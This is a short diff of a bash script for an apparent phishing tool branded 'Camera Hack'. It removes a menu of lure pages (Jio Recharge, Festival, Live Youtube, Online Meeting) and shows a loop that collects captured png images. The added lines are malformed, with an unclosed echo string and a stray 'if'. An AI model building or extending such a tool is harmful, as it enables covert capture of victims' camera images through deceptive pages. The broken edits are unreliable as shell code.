@@ -377,25 +377,10 @@ while true; do
 clear
 echo -e "$logo"
 sleep 1
-echo -e "\e[1;96m< < ==================== < Phishing Page > ==================== > >\e[m "
-printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
-echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Jio Recharge \e[0m       \e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;91;107m Festival \e[0m   "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
-echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;37;41m Live Youtube \e[0m       \e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;34;103m Online Meeting \e[0m   "
-echo " "
-echo -e "\e[1;96m< < ==================== < Tool Setting > ==================== > >\e[m "
-echo ""
-
-
-
-echo " "
-echo -e "\e[1;96m< < < ============================================================ > > >\e[m "
-echo ""
-
-
+echo -e "$logo"
+sleep 1
+echo -e "${ask}Choose a option:
+bash OnlineHacking/logo2.sh
 "
 sleep 1
 printf "${cyan}\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
@@ -571,6 +556,6 @@ while true; do
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
-   
+   if
     sleep 0.5
 done 
